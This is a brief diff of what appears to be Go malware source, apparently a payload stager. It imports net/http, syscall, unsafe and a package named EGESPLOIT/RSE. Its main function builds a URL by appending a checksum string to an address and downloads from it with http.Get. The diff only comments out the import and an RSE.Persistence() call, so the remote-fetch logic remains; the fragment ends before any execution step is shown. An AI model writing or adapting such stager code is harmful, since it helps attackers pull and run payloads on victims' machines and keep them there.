@@ -4,7 +4,7 @@ import "net/http"
 import "syscall"
 import "unsafe"
 import "io/ioutil"
-import "EGESPLOIT/RSE"
+//import "EGESPLOIT/RSE"
 
 
 
@@ -20,7 +20,7 @@ var Checksum string = "102011b7txpl71n"
 
 
 func main() {
-  RSE.Persistence()
+  //RSE.Persistence()
   Address += Checksum
   Response, err := http.Get(Address)
   if err != nil {
